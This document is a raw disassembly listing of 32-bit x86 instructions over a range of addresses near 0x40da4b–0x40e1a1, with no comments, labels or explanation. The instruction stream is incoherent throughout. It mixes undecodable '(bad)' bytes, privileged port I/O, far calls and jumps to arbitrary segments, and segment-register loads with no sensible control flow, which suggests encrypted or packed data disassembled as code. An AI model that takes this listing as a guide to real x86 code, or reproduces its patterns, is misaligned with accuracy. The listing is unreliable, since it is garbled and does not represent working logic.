  40da4b:	hlt    
  40da4c:	imul   esi,esp,0xce6a503b
  40da52:	adc    BYTE PTR [ebx-0x7f],dl
  40da55:	push   0xfffffff7
  40da57:	test   BYTE PTR [edx-0x6cbe9dca],ch
  40da5d:	inc    esp
  40da5e:	ret    
  40da5f:	pop    edx
  40da60:	arpl   WORD PTR [esi-0x625e20c8],ax
  40da66:	push   ss
  40da67:	test   al,0x5f
  40da69:	mov    edi,0x4a224d8
  40da6e:	nop
  40da6f:	pop    edx
  40da70:	test   DWORD PTR [ebx+0x64],ecx
  40da73:	(bad)  [ebp+0x27]
  40da76:	adc    cl,ch
  40da78:	pop    ecx
  40da79:	mov    eax,0xafa1c620
  40da7e:	lds    edx,FWORD PTR [ebp+0x7e]
  40da81:	sub    ch,BYTE PTR [ecx+eax*1-0x7c]
  40da85:	loopne 0x40da57
  40da87:	xchg   esi,eax
  40da88:	out    dx,al
  40da89:	and    edi,ebx
  40da8b:	dec    eax
  40da8c:	jecxz  0x40da74
  40da8e:	mov    cs,WORD PTR [ebx]
  40da90:	pop    eax
  40da91:	shr    BYTE PTR [ebp-0x5e],cl
  40da94:	jl     0x40dac1
  40da96:	ror    BYTE PTR [edx-0x4bdae6f2],1
  40da9c:	adc    dl,ah
  40da9e:	out    dx,al
  40da9f:	jnp    0x40dad2
  40daa1:	and    BYTE PTR [eax-0x342b3e71],bl
  40daa7:	inc    eax
  40daa8:	outs   dx,BYTE PTR ds:[esi]
  40daa9:	xchg   ebx,eax
  40daaa:	jge    0x40daf7
  40daac:	fcmove st,st(4)
  40daae:	push   esp
  40daaf:	test   al,0x66
  40dab1:	mov    esi,DWORD PTR [eax+0x75f99d4f]
  40dab7:	fcom   st(4)
  40dab9:	and    edx,DWORD PTR [ecx]
  40dabb:	push   0x12
  40dabd:	push   ecx
  40dabe:	sbb    BYTE PTR [ecx-0x67],ah
  40dac1:	sbb    DWORD PTR [ebx+0x4e],esp
  40dac4:	push   edx
  40dac5:	lods   eax,DWORD PTR ds:[esi]
  40dac6:	shl    BYTE PTR [eax+ebp*4],1
  40dac9:	add    edx,esp
  40dacb:	mov    esi,0x2202b0f6
  40dad0:	scas   al,BYTE PTR es:[edi]
  40dad1:	out    0xbb,al
  40dad3:	jle    0x40da9f
  40dad5:	pop    ebp
  40dad6:	adc    ah,BYTE PTR [esi+eiz*8+0x33f238d5]
  40dadd:	dec    edx
  40dade:	dec    eax
  40dadf:	cmp    DWORD PTR [eax+ebx*4+0x67],ebp
  40dae3:	cmp    eax,0xabd5cf90
  40dae8:	lahf   
  40dae9:	out    dx,eax
  40daea:	jo     0x40da8e
  40daec:	fisub  DWORD PTR ds:0xd621868a
  40daf2:	sahf   
  40daf3:	dec    edx
  40daf4:	mov    esp,0xda903efa
  40daf9:	pop    es
  40dafa:	stos   DWORD PTR es:[edi],eax
  40dafb:	clc    
  40dafc:	mov    al,0x8a
  40dafe:	pop    esi
  40daff:	add    DWORD PTR ds:0x735712b8,ecx
  40db05:	call   0x492abcd6
  40db0a:	dec    ebp
  40db0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db0c:	and    esi,ecx
  40db0e:	sbb    bl,BYTE PTR [ecx+0x547848b2]
  40db14:	cdq    
  40db15:	sahf   
  40db16:	add    al,0x73
  40db18:	mov    ?,WORD PTR [esi]
  40db1a:	xor    esp,DWORD PTR [edx+0x745d75cf]
  40db20:	xchg   edx,eax
  40db21:	pop    ds
  40db22:	pop    esi
  40db23:	dec    ebp
  40db24:	rcr    eax,cl
  40db26:	stc    
  40db27:	push   0x19
  40db29:	jge    0x40dac0
  40db2b:	call   0x80b4:0xc1ddefca
  40db32:	pop    ss
  40db33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db34:	fiadd  WORD PTR [esp+ebx*4]
  40db37:	mov    esp,0x6436fc8
  40db3c:	push   esi
  40db3d:	mov    edi,esp
  40db3f:	push   ebp
  40db40:	xor    dh,al
  40db42:	mov    esp,0xb3932747
  40db47:	push   edi
  40db48:	(bad)  
  40db4a:	xchg   ebp,eax
  40db4b:	push   ds
  40db4c:	push   ebp
  40db4d:	or     DWORD PTR [edx+0x6240f63e],0x28
  40db54:	in     al,0xd6
  40db56:	arpl   WORD PTR [edx],bp
  40db58:	out    0x67,al
  40db5a:	add    BYTE PTR [esi+0x63a0a22d],0xe7
  40db61:	(bad)  
  40db62:	icebp  
  40db63:	cli    
  40db64:	push   ds
  40db65:	dec    ecx
  40db66:	jp     0x40db7a
  40db68:	in     eax,dx
  40db69:	sub    BYTE PTR [ebp-0x1],bl
  40db6c:	or     al,0xcf
  40db6e:	and    DWORD PTR [ebx+0x3d244d89],ebx
  40db74:	fstp   TBYTE PTR [ebp-0xa4f06b2]
  40db7a:	das    
  40db7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db7c:	or     ebp,DWORD PTR [ebx-0x720de009]
  40db82:	int    0x7
  40db84:	pop    es
  40db85:	in     eax,dx
  40db86:	movzx  eax,WORD PTR [eax+0x71]
  40db8a:	ds dec edx
  40db8c:	jp     0x40db13
  40db8e:	or     al,cl
  40db90:	fidiv  WORD PTR [edx+0xd]
  40db93:	pushf  
  40db94:	dec    eax
  40db95:	in     al,dx
  40db96:	jo     0x40db48
  40db98:	int    0xf8
  40db9a:	cmp    bh,BYTE PTR [edx+edi*2-0x6559287e]
  40dba1:	pop    ebx
  40dba2:	shl    DWORD PTR [edi],cl
  40dba4:	pop    es
  40dba5:	mov    bh,0x33
  40dba7:	sub    al,0x29
  40dba9:	sbb    edi,DWORD PTR [edi-0x7b7f2669]
  40dbaf:	jle    0x40dbe9
  40dbb1:	mov    cs,WORD PTR [ebx-0x6fd95f41]
  40dbb7:	inc    ebx
  40dbb8:	xchg   ebp,eax
  40dbb9:	xor    DWORD PTR [esi-0x51],esi
  40dbbc:	into   
  40dbbd:	adc    ch,BYTE PTR [ebp+0x3c]
  40dbc0:	cli    
  40dbc1:	mov    ch,0x91
  40dbc3:	mov    ecx,0x6a8e8e83
  40dbc8:	cwde   
  40dbc9:	sub    DWORD PTR [eax],ebp
  40dbcb:	and    edi,esp
  40dbcd:	sbb    al,0x2
  40dbcf:	stc    
  40dbd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd1:	std    
  40dbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd3:	push   ebp
  40dbd4:	cmp    edx,DWORD PTR [ebx+0x6e]
  40dbd7:	jle    0x40dbe5
  40dbd9:	pop    eax
  40dbda:	jmp    0x40dbcb
  40dbdc:	subps  xmm1,XMMWORD PTR [esi-0x25]
  40dbe0:	fstp   QWORD PTR [ebp-0x51]
  40dbe3:	popf   
  40dbe4:	mov    edx,0x7ea5c7df
  40dbe9:	or     DWORD PTR [eax+0x631436d5],esi
  40dbef:	jb     0x40dbe9
  40dbf1:	push   ss
  40dbf2:	test   eax,0x6f580e6e
  40dbf7:	addr16 bswap esp
  40dbfa:	fs aam 0x50
  40dbfd:	jecxz  0x40dc12
  40dbff:	xchg   esp,eax
  40dc00:	fs out dx,al
  40dc02:	xchg   ebx,eax
  40dc03:	(bad)  
  40dc04:	pop    ecx
  40dc05:	mov    es,WORD PTR [esi-0x72]
  40dc08:	test   al,0x89
  40dc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0b:	xor    DWORD PTR [edi],0x5b306733
  40dc11:	shl    DWORD PTR [eax],cl
  40dc13:	repnz pop ecx
  40dc15:	push   0x51
  40dc17:	test   al,0x56
  40dc19:	xor    edi,edx
  40dc1b:	xchg   edx,eax
  40dc1c:	mov    edi,0x3576ca11
  40dc21:	and    dh,BYTE PTR [ebx-0x14]
  40dc24:	mov    ecx,0x2799017d
  40dc29:	push   cs
  40dc2a:	addr16 xchg ecx,eax
  40dc2c:	shr    DWORD PTR [ebx-0x55],cl
  40dc2f:	mov    edx,esp
  40dc31:	stc    
  40dc32:	jge    0x40dc14
  40dc34:	mov    al,0x70
  40dc36:	cmp    esp,DWORD PTR [eax]
  40dc38:	lea    ebx,[ebp+0x1d4d02ca]
  40dc3e:	pop    ebx
  40dc3f:	sub    cl,BYTE PTR [esi+eax*2]
  40dc42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc43:	mov    ch,0x9e
  40dc45:	jns    0x40dc51
  40dc47:	xchg   ecx,eax
  40dc48:	outs   dx,DWORD PTR ds:[esi]
  40dc49:	push   0x2f0e6937
  40dc4e:	push   ss
  40dc4f:	inc    ebx
  40dc50:	icebp  
  40dc51:	xchg   edx,eax
  40dc52:	stos   DWORD PTR es:[edi],eax
  40dc53:	sub    al,0x9b
  40dc55:	xchg   ebp,eax
  40dc56:	shr    DWORD PTR [esi],cl
  40dc58:	jb     0x40dc54
  40dc5a:	aas    
  40dc5b:	repnz sti 
  40dc5d:	adc    eax,0xaf4428b4
  40dc62:	jbe    0x40dc95
  40dc64:	pop    eax
  40dc65:	adc    eax,0x61e291e1
  40dc6a:	push   esi
  40dc6b:	(bad)  
  40dc6c:	lock mov eax,ds:0xa294f0f
  40dc72:	or     al,0x3f
  40dc75:	std    
  40dc76:	push   es
  40dc77:	jno    0x40dc7d
  40dc79:	sub    DWORD PTR [esi],ecx
  40dc7b:	mov    ds:0x5e5ca847,eax
  40dc80:	push   eax
  40dc81:	movq   mm3,QWORD PTR [esi+0x61]
  40dc85:	push   cs
  40dc86:	mov    esp,0xc2d4b777
  40dc8b:	lods   eax,DWORD PTR ds:[esi]
  40dc8c:	sub    esi,DWORD PTR [ecx+ecx*2-0x3163ac]
  40dc93:	or     DWORD PTR [edx+0x4cd9649d],esi
  40dc99:	dec    edi
  40dc9a:	shl    BYTE PTR [edx-0x52eb02b3],0x33
  40dca1:	stc    
  40dca2:	cmp    esi,ecx
  40dca4:	sbb    DWORD PTR ds:0xb9c44047,ebp
  40dcaa:	and    DWORD PTR [ebx],esi
  40dcac:	lock xchg ebx,eax
  40dcae:	aas    
  40dcaf:	mov    DWORD PTR [ebp+eax*1+0x1b],esi
  40dcb3:	(bad)  
  40dcb5:	ds repnz jmp 0x5b36:0xb34feefc
  40dcbe:	push   ecx
  40dcbf:	mov    ebp,0x41fd3a21
  40dcc4:	jne    0x40dd26
  40dcc6:	add    BYTE PTR [edi],0x4f
  40dcc9:	pop    ss
  40dcca:	into   
  40dccb:	dec    edx
  40dccc:	(bad)  
  40dccd:	adc    al,0xb6
  40dccf:	xor    DWORD PTR [eax+0x79],edi
  40dcd2:	fiadd  DWORD PTR [ecx-0x2b]
  40dcd5:	sahf   
  40dcd6:	data16 jns 0x40dd1f
  40dcd9:	mov    eax,0xa05e94ed
  40dcde:	inc    ebx
  40dcdf:	inc    edx
  40dce0:	pusha  
  40dce1:	rcl    BYTE PTR [edi+ebx*1],1
  40dce4:	lock cdq 
  40dce6:	sahf   
  40dce7:	clc    
  40dce8:	pop    edx
  40dce9:	mov    ds,ebp
  40dceb:	leave  
  40dcec:	mov    ecx,0x8ef368bc
  40dcf1:	jp     0x40dd40
  40dcf3:	or     esi,ebp
  40dcf5:	and    eax,0xce496922
  40dcfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcfb:	ret    0xe57a
  40dcfe:	iret   
  40dcff:	out    0x94,al
  40dd01:	mov    al,0xf1
  40dd03:	jbe    0x40dd05
  40dd05:	add    DWORD PTR [esp+eiz*8-0x4958b1ba],esp
  40dd0c:	jns    0x40dcf5
  40dd0e:	outs   dx,DWORD PTR ds:[esi]
  40dd0f:	mov    dh,bh
  40dd11:	jmp    0xf51003a5
  40dd16:	test   al,0x1f
  40dd18:	or     ch,bh
  40dd1a:	lods   eax,DWORD PTR ds:[esi]
  40dd1b:	aaa    
  40dd1c:	retf   
  40dd1d:	outs   dx,BYTE PTR ds:[esi]
  40dd1e:	cli    
  40dd1f:	test   DWORD PTR ds:0x34adb56c,ebp
  40dd25:	call   0x6bbe6775
  40dd2a:	int    0x36
  40dd2c:	fnstcw WORD PTR [edx-0x1]
  40dd2f:	and    eax,0x8e735e9a
  40dd34:	pop    edx
  40dd35:	sub    al,0x6a
  40dd37:	sub    esi,esp
  40dd39:	sub    BYTE PTR [esp-0x13],0xee
  40dd3e:	int3   
  40dd3f:	mov    esp,0x3a0a3f33
  40dd44:	pop    esi
  40dd45:	out    0xb1,al
  40dd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd48:	cmp    BYTE PTR [ebp+eiz*1+0x4d],ah
  40dd4c:	(bad)  
  40dd4d:	jnp    0x40dcfd
  40dd4f:	push   edx
  40dd50:	es inc esi
  40dd52:	xor    edi,edx
  40dd54:	sub    edx,DWORD PTR [ebp+0x26]
  40dd57:	lods   eax,DWORD PTR ds:[esi]
  40dd58:	je     0x40dd78
  40dd5a:	in     eax,0x2f
  40dd5c:	dec    ecx
  40dd5d:	rcr    DWORD PTR [edi-0x10],1
  40dd60:	hlt    
  40dd61:	and    al,BYTE PTR [edi-0x71]
  40dd64:	popf   
  40dd65:	leave  
  40dd66:	fild   DWORD PTR [ebx]
  40dd68:	mov    edi,0xb6359bda
  40dd6d:	imul   ecx,DWORD PTR [ecx],0xffffffaf
  40dd70:	push   0xc23ef1c0
  40dd75:	cmp    DWORD PTR [eax],edi
  40dd77:	ins    BYTE PTR es:[edi],dx
  40dd78:	dec    esi
  40dd79:	pop    ds
  40dd7a:	and    al,0xe9
  40dd7c:	cdq    
  40dd7d:	cmp    eax,0x3cf57435
  40dd82:	ror    BYTE PTR [edx+edi*2],cl
  40dd85:	jno    0x40dd2b
  40dd87:	scas   eax,DWORD PTR es:[edi]
  40dd88:	jl     0x40dda4
  40dd8a:	dec    edx
  40dd8b:	data16 jl 0x40dd48
  40dd8e:	mov    ah,0xf9
  40dd90:	addr16 inc ecx
  40dd92:	push   ss
  40dd93:	dec    ebp
  40dd94:	cmp    bh,BYTE PTR [ebp+0x634d65c2]
  40dd9a:	les    eax,FWORD PTR [edi+edi*2+0x4]
  40dd9e:	xchg   edi,eax
  40dd9f:	sbb    DWORD PTR [edx+edx*8],0xa880c96d
  40dda6:	mov    ecx,0x3d6280aa
  40ddab:	xor    eax,0xe3841f81
  40ddb0:	jae    0x40dd66
  40ddb2:	mov    ds:0xae60b95,eax
  40ddb7:	sub    eax,0xacfb2178
  40ddbc:	(bad)  
  40ddbd:	stos   BYTE PTR es:[edi],al
  40ddbe:	jb     0x40dd77
  40ddc0:	sbb    eax,0xadfd5546
  40ddc5:	xchg   ecx,eax
  40ddc6:	cmp    al,0xb6
  40ddc8:	out    0xb4,eax
  40ddca:	push   edx
  40ddcb:	in     eax,0xa9
  40ddcd:	add    dl,BYTE PTR [edi+0xf5d4d22]
  40ddd3:	std    
  40ddd4:	xor    DWORD PTR [ebx-0x57f567a9],ecx
  40ddda:	push   es
  40dddb:	cmp    eax,0xb5d60283
  40dde0:	jecxz  0x40dd99
  40dde2:	mov    ds:0x1d8e9fa1,al
  40dde7:	push   ss
  40dde8:	into   
  40dde9:	jmp    ebx
  40ddeb:	fist   WORD PTR [edx+eiz*1]
  40ddee:	imul   eax,DWORD PTR [ebx-0x39],0xffffffe0
  40ddf2:	mov    BYTE PTR [ecx+0x2f60d0e1],0xfc
  40ddf9:	cmp    eax,0x4eecc514
  40ddfe:	jp     0x40dd9f
  40de00:	jmp    0x40dda7
  40de02:	ret    
  40de03:	out    dx,al
  40de04:	(bad)  
  40de06:	dec    ebx
  40de07:	mov    bh,0x3e
  40de09:	in     al,0xc3
  40de0b:	callw  0xbc39
  40de0f:	stos   DWORD PTR es:[edi],eax
  40de10:	push   DWORD PTR [ecx+0x1c]
  40de13:	mov    ah,0xb
  40de15:	stos   DWORD PTR es:[edi],eax
  40de16:	dec    ecx
  40de17:	in     eax,dx
  40de18:	outs   dx,DWORD PTR ds:[esi]
  40de19:	and    ebp,DWORD PTR [edx-0x3f749fc]
  40de1f:	sbb    BYTE PTR ds:0x905bf908,ch
  40de25:	mov    ch,0x3f
  40de27:	cwde   
  40de28:	xchg   DWORD PTR [ebx],esi
  40de2a:	inc    esp
  40de2b:	xchg   dh,ch
  40de2d:	into   
  40de2e:	ds dec ebx
  40de30:	xchg   edi,eax
  40de31:	in     eax,0x7e
  40de33:	fmul   st,st(6)
  40de35:	add    ebx,DWORD PTR [ecx-0x3f]
  40de38:	fs popf 
  40de3a:	enter  0x7968,0x33
  40de3e:	cmp    esi,DWORD PTR [edi]
  40de40:	pop    ebx
  40de41:	add    ch,BYTE PTR [eax+0x13]
  40de44:	data16 je 0x40dded
  40de47:	stos   DWORD PTR es:[edi],eax
  40de48:	mov    ds:0x9877d2af,al
  40de4d:	jae    0x40deba
  40de4f:	mov    ebx,0x1218edbd
  40de54:	jo     0x40de51
  40de56:	sub    ecx,DWORD PTR [ecx+0x628b242]
  40de5c:	xchg   ebp,esi
  40de5e:	(bad)  
  40de5f:	dec    esp
  40de60:	(bad)  [eax+edi*2-0x2ad10250]
  40de67:	dec    esp
  40de68:	cs jne 0x40ddf8
  40de6b:	cdq    
  40de6c:	or     al,0x26
  40de6e:	add    ecx,DWORD PTR [esi+0xb]
  40de71:	add    eax,0x98f34c84
  40de76:	and    eax,0x67ab20a6
  40de7b:	jecxz  0x40de57
  40de7d:	mov    al,0xd4
  40de7f:	pusha  
  40de80:	dec    esp
  40de81:	bound  edi,QWORD PTR [esi+edi*8-0x8]
  40de85:	aaa    
  40de86:	xor    al,0x3f
  40de88:	cwde   
  40de89:	shr    DWORD PTR ds:0x504dd0cf,1
  40de8f:	cs pop ebp
  40de91:	gs das 
  40de93:	cli    
  40de94:	in     al,0x98
  40de96:	or     bh,BYTE PTR [edi]
  40de98:	pushf  
  40de99:	bound  ebx,QWORD PTR [ebx]
  40de9b:	rol    DWORD PTR [edx+0x494243d8],1
  40dea1:	int    0x3b
  40dea3:	mov    esi,0x2ad2befd
  40dea8:	int    0xc3
  40deaa:	int3   
  40deab:	push   eax
  40deac:	imul   edx,DWORD PTR [esi],0xff7b4c44
  40deb2:	stos   DWORD PTR es:[edi],eax
  40deb3:	leave  
  40deb4:	arpl   WORD PTR [eax],bp
  40deb6:	adc    BYTE PTR [edi+0x79],al
  40deb9:	mov    ds:0x413866d8,eax
  40debe:	icebp  
  40debf:	call   FWORD PTR [eax-0x5e33bba4]
  40dec5:	xchg   ebx,eax
  40dec6:	inc    edx
  40dec7:	mov    al,ds:0xfb638388
  40decc:	popa   
  40decd:	int3   
  40dece:	js     0x40dec8
  40ded0:	loope  0x40df12
  40ded2:	sbb    ch,BYTE PTR [ebx+0x660f3c84]
  40ded8:	loopne 0x40de5c
  40deda:	jecxz  0x40defb
  40dedc:	icebp  
  40dedd:	inc    ebp
  40dede:	(bad)  
  40dedf:	int    0x76
  40dee1:	pop    es
  40dee2:	sub    cl,BYTE PTR [edi+0x9]
  40dee5:	push   0x9fb62dd
  40deea:	and    BYTE PTR [ebx+0xba677a2],ch
  40def0:	std    
  40def1:	add    ebx,DWORD PTR [ebp-0x1fbaf14a]
  40def7:	dec    ebp
  40def8:	dec    esi
  40def9:	sbb    DWORD PTR [ecx-0x24],esi
  40defc:	cmp    bl,BYTE PTR [ebx+0x11]
  40deff:	mov    ds:0x36e9574f,eax
  40df04:	inc    eax
  40df05:	push   ebp
  40df06:	xchg   edx,eax
  40df07:	imul   DWORD PTR [edx-0x79]
  40df0a:	push   eax
  40df0b:	dec    ecx
  40df0c:	fistp  QWORD PTR [esi-0x320894fd]
  40df12:	jb     0x40dec3
  40df14:	xchg   BYTE PTR [ebp+ebx*1-0x6e],cl
  40df18:	(bad)  
  40df19:	jno    0x40df89
  40df1b:	or     edx,esi
  40df1d:	sbb    eax,0x850f526e
  40df22:	in     eax,dx
  40df23:	jl     0x40df69
  40df25:	aaa    
  40df26:	enter  0x4631,0xdb
  40df2a:	lock into 
  40df2c:	fistp  WORD PTR [eax-0x4b]
  40df2f:	mov    bl,0x51
  40df31:	mov    esi,0x458688d5
  40df36:	(bad)  
  40df37:	jecxz  0x40df85
  40df39:	jle    0x40df4a
  40df3b:	dec    eax
  40df3c:	xor    al,0x7c
  40df3e:	sbb    al,0xf4
  40df40:	stos   BYTE PTR es:[edi],al
  40df41:	adc    eax,0x5ad9f486
  40df46:	lock in eax,dx
  40df48:	dec    ecx
  40df49:	and    cl,BYTE PTR [edi+0x334056ac]
  40df4f:	fistp  DWORD PTR [eax+ebp*2-0x11]
  40df53:	xchg   ecx,eax
  40df54:	mov    ebp,0x99545914
  40df59:	mov    ch,0x48
  40df5b:	cmp    BYTE PTR [edx+0x5c],al
  40df5e:	ins    DWORD PTR es:[edi],dx
  40df5f:	pop    ss
  40df60:	mov    esi,DWORD PTR [edi]
  40df62:	stos   DWORD PTR es:[edi],eax
  40df63:	sub    eax,0xc4609319
  40df68:	mov    al,0x45
  40df6a:	stc    
  40df6b:	nop
  40df6c:	adc    al,0x70
  40df6e:	sahf   
  40df6f:	inc    ebp
  40df70:	mov    bh,0x55
  40df72:	xchg   DWORD PTR [ebx+0x2b],ecx
  40df75:	mov    dl,0xcb
  40df77:	in     al,0x10
  40df79:	jae    0x40df93
  40df7b:	jmp    0xe9c5bea2
  40df80:	or     BYTE PTR [ebx+0x16],bh
  40df83:	jmp    0xc8dd:0x61a86bbd
  40df8a:	popa   
  40df8b:	xor    eax,0x1c922e91
  40df90:	pop    edi
  40df91:	sub    al,BYTE PTR [edi-0x6831e593]
  40df97:	mov    eax,ds:0x7dd9118e
  40df9c:	xchg   ecx,eax
  40df9d:	jnp    0x40dfb8
  40df9f:	xor    ebx,DWORD PTR [esi+0x4d]
  40dfa2:	pushf  
  40dfa3:	clc    
  40dfa4:	outs   dx,BYTE PTR ds:[esi]
  40dfa5:	sub    ebp,DWORD PTR [ecx+0xc]
  40dfa8:	inc    edi
  40dfa9:	adc    eax,0xd6180886
  40dfae:	mov    BYTE PTR [eax],ch
  40dfb0:	pop    es
  40dfb1:	jge    0x40dfee
  40dfb3:	das    
  40dfb4:	mov    ds:0x65fd686f,al
  40dfb9:	aam    0x64
  40dfbb:	aad    0xcc
  40dfbd:	push   ecx
  40dfbe:	jo     0x40df82
  40dfc0:	xor    al,0x60
  40dfc2:	cmc    
  40dfc3:	mov    bl,0x36
  40dfc5:	cmp    al,BYTE PTR [edx+0x767e93e]
  40dfcb:	xchg   edx,eax
  40dfcc:	ja     0x40df8b
  40dfce:	lods   al,BYTE PTR ds:[esi]
  40dfcf:	jnp    0x40df68
  40dfd1:	xchg   edi,eax
  40dfd2:	in     eax,0xee
  40dfd4:	pop    edi
  40dfd5:	jp     0x40df57
  40dfd7:	dec    eax
  40dfd8:	arpl   WORD PTR [ecx-0x68],bx
  40dfdb:	stos   BYTE PTR es:[edi],al
  40dfdc:	retf   
  40dfdd:	inc    edi
  40dfde:	popa   
  40dfdf:	mov    ds:0x94e45f20,al
  40dfe4:	pop    ss
  40dfe5:	pop    es
  40dfe6:	xchg   esp,eax
  40dfe7:	add    ch,BYTE PTR [edx-0x3d7f915f]
  40dfed:	jns    0x40e05a
  40dfef:	xchg   ebx,eax
  40dff0:	push   ss
  40dff1:	cs js  0x40e013
  40dff4:	xchg   esi,eax
  40dff5:	fldenv [ecx+0x5f96d46f]
  40dffb:	imul   edx,DWORD PTR [ebx+eax*8+0x5e],0x1ac0bf69
  40e003:	jnp    0x40dff1
  40e005:	inc    ebp
  40e006:	mov    ch,0x1f
  40e008:	scas   eax,DWORD PTR es:[edi]
  40e009:	jecxz  0x40dfdf
  40e00b:	sbb    eax,0x7ed436e5
  40e010:	jne    0x40e023
  40e012:	push   es
  40e013:	outs   dx,BYTE PTR ds:[esi]
  40e014:	jmp    0x8d71:0x17d1f5a5
  40e01b:	nop    DWORD PTR [ebx+0x57]
  40e01f:	cs das 
  40e021:	in     eax,dx
  40e022:	sub    al,0x91
  40e024:	out    dx,eax
  40e025:	aas    
  40e026:	out    0x2,al
  40e028:	ins    DWORD PTR es:[edi],dx
  40e029:	(bad)  
  40e02a:	call   0x3d01fdd1
  40e02f:	adc    BYTE PTR [ecx],0x25
  40e032:	retf   0x8b02
  40e035:	fisub  DWORD PTR [edi+edi*8+0x3166649f]
  40e03c:	push   0x8
  40e03e:	sub    al,0x3e
  40e040:	ss scas al,BYTE PTR es:[edi]
  40e042:	push   ebp
  40e043:	push   edi
  40e044:	jl     0x40e0c1
  40e046:	pop    es
  40e047:	mov    ds:0x6797a566,al
  40e04c:	outs   dx,BYTE PTR ds:[esi]
  40e04d:	out    dx,eax
  40e04e:	and    DWORD PTR [edi+ebx*4+0x59],esp
  40e052:	in     eax,0x36
  40e054:	stos   DWORD PTR es:[edi],eax
  40e055:	or     eax,0xc3ef54ea
  40e05a:	adc    dl,al
  40e05c:	jnp    0x40e087
  40e05e:	stos   DWORD PTR es:[edi],eax
  40e05f:	push   edx
  40e060:	into   
  40e061:	stc    
  40e062:	rcr    cl,1
  40e064:	sub    ch,ch
  40e066:	cmp    BYTE PTR [esi],0xa1
  40e069:	inc    eax
  40e06a:	imul   esi,DWORD PTR [ebp+0x6e],0x4e6fca10
  40e071:	cld    
  40e072:	xchg   esi,eax
  40e073:	xor    al,0x99
  40e075:	retf   0xffbe
  40e078:	mov    eax,0xde33e36b
  40e07d:	add    BYTE PTR [ecx+eiz*8+0x24e1929e],ah
  40e084:	push   ecx
  40e085:	adc    eax,0x6880f96c
  40e08a:	call   0xd51a:0x6bd3301f
  40e091:	imul   ebp,DWORD PTR [ecx],0xf
  40e094:	ret    0xaa3a
  40e097:	xchg   ecx,eax
  40e098:	dec    ebp
  40e099:	add    ebp,DWORD PTR [edx+esi*4-0x2a1e7c72]
  40e0a0:	ja     0x40e0fc
  40e0a2:	mov    esp,0x828fb35a
  40e0a7:	mov    eax,ds:0xa8b931e1
  40e0ac:	test   BYTE PTR [edx+0x7d],ah
  40e0af:	add    ecx,DWORD PTR [edi]
  40e0b1:	(bad)  
  40e0b2:	nop
  40e0b3:	nop
  40e0b4:	push   edi
  40e0b5:	or     DWORD PTR [ebx],ecx
  40e0b7:	popa   
  40e0b8:	adc    al,0x2a
  40e0ba:	or     BYTE PTR [edi],0x33
  40e0bd:	and    eax,eax
  40e0bf:	xchg   ebx,eax
  40e0c0:	inc    edi
  40e0c1:	fsub   DWORD PTR [edx]
  40e0c3:	jns    0x40e0bd
  40e0c5:	mov    ds:0x2a374cd9,al
  40e0ca:	inc    eax
  40e0cb:	mov    ds:0x6e357afe,eax
  40e0d0:	daa    
  40e0d1:	test   al,0x8f
  40e0d3:	fnstsw WORD PTR [eax]
  40e0d5:	repz sub esi,DWORD PTR [edi+0x4f]
  40e0d9:	lea    esp,es:[edx-0x789f0180]
  40e0e0:	mov    cl,0xc0
  40e0e2:	or     ecx,DWORD PTR [edx]
  40e0e4:	sbb    al,0xd5
  40e0e6:	mul    al
  40e0e8:	fisttp DWORD PTR [ebx+edx*8+0x8]
  40e0ec:	enter  0x790e,0xf8
  40e0f0:	stos   DWORD PTR es:[edi],eax
  40e0f1:	push   esi
  40e0f2:	call   0xc8c9:0x6d6b2b73
  40e0f9:	sbb    BYTE PTR [ebx+0x59],cl
  40e0fc:	ror    ebp,1
  40e0fe:	jns    0x40e0d5
  40e100:	sub    bh,BYTE PTR [ebp-0x4171530d]
  40e106:	test   al,0x1e
  40e108:	dec    ebx
  40e109:	dec    ecx
  40e10a:	dec    ebp
  40e10b:	ror    ebx,0x3
  40e10e:	aas    
  40e10f:	push   ecx
  40e110:	jo     0x40e094
  40e112:	jnp    0x40e121
  40e114:	push   0x4a
  40e116:	in     eax,0x88
  40e118:	data16 mov ch,0xfb
  40e11b:	scas   al,BYTE PTR es:[edi]
  40e11c:	inc    ecx
  40e11d:	fistp  DWORD PTR [ebx+0x56]
  40e120:	call   0x7ee586b4
  40e125:	mov    ah,BYTE PTR [ebp-0x1582f665]
  40e12b:	rcr    DWORD PTR [ebp-0x77],1
  40e12e:	mov    ebx,0xe906ca02
  40e133:	iret   
  40e134:	mov    ebp,0xfd3f1ab6
  40e139:	jb     0x40e147
  40e13b:	mov    cl,0xa6
  40e13d:	push   es
  40e13e:	xchg   ecx,eax
  40e13f:	(bad)  
  40e140:	iret   
  40e141:	push   eax
  40e142:	mov    bl,0x96
  40e144:	sub    DWORD PTR [ecx+0x24],esp
  40e147:	out    dx,al
  40e148:	xor    ecx,DWORD PTR [edx+0x53]
  40e14b:	mov    edi,0x59d419c4
  40e150:	outs   dx,BYTE PTR ds:[esi]
  40e151:	or     esi,DWORD PTR [esi]
  40e153:	mov    cl,0xef
  40e155:	and    eax,0x824e2c69
  40e15a:	sbb    DWORD PTR [ecx+0xd0ca65e],ebx
  40e160:	fmul   QWORD PTR [ecx]
  40e162:	inc    edi
  40e163:	std    
  40e164:	sti    
  40e165:	enter  0x89bc,0x3a
  40e169:	pop    es
  40e16a:	push   0xbc152982
  40e16f:	in     al,0x33
  40e171:	loop   0x40e128
  40e173:	or     DWORD PTR [edi-0x37],edx
  40e176:	jle    0x40e1bb
  40e178:	pop    es
  40e179:	jle    0x40e17a
  40e17b:	or     al,0x1a
  40e17d:	repz out dx,eax
  40e17f:	stc    
  40e180:	outs   dx,DWORD PTR ds:[esi]
  40e181:	push   0xffffffbf
  40e183:	xchg   edx,eax
  40e184:	icebp  
  40e185:	pop    eax
  40e186:	mov    ds:0x1dc1563f,al
  40e18b:	adc    DWORD PTR [edx+0x0],esp
  40e18e:	adc    esp,DWORD PTR [esi-0x2abbf158]
  40e194:	add    BYTE PTR [ebp*8+0x722823df],dh
  40e19b:	fsubr  DWORD PTR [ebx+eax*8+0x7c]
  40e19f:	xchg   ebp,eax
  40e1a0:	hlt    
  40e1a1:	dec    edx
